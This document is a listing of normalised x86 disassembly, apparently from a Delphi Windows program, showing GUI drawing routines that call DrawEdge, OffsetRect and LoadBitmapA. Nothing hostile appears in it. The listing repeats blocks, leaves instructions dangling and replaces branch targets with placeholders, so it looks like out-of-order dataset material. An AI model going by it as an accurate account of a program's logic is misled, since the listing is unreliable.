mov eax [ eax - 0x4c ]
call sub_4212bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41cb58
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_440c60
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d324
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d6c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d31c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4222c0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d2f8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d6c8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d6c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d804
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_440f50
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d324
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_443c4c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41ce24
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dadc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d61c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41cb58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4030f0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dadc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_443c4c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44478b
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_442d10
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_443c4c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_4447a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4450ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d6c8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d324
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41cb58
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042b8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d324
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d6c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_440c60
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dadc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d31c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d324
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d324
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d6c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d31c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4222c0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d2f8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d6c8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d6c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_444bef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4212bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41cb58
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_440c60
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d324
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_443c4c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41ce24
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dadc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d804
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_440f50
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dadc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
